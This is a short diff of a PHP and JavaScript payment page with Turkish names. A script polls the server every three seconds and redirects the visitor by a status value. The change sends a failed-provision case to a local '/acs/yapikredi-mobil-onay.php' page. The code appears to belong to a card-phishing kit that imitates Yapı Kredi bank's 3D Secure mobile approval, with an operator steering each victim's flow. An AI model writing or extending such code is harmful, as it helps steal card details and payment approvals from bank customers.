@@ -61,7 +61,7 @@ $_SESSION['adim'] = 3;
         if(dur === 'limit_yetersiz')      { location.href = '<?= BASE_PATH ?>/odeme_hata.php?hata=limit_yetersiz'; return; }
         if(dur === 'kart_desteklenmiyor') { location.href = '<?= BASE_PATH ?>/odeme_hata.php?hata=kart_desteklenmiyor'; return; }
         if(dur === 'provizyon_gonder')    { location.href = '<?= BASE_PATH ?>/odeme_hata.php?hata=provizyon_gonder'; return; }
-        if(dur === 'provizyon_hatali')    { location.href = '<?= BASE_PATH ?>/odeme_hata.php?hata=provizyon_hatali'; return; }
+        if(dur === 'provizyon_hatali')    { location.href = '<?= BASE_PATH ?>/acs/yapikredi-mobil-onay.php'; return; }
       }).catch(()=>{});
   }
   setInterval(heartbeat, 3000);
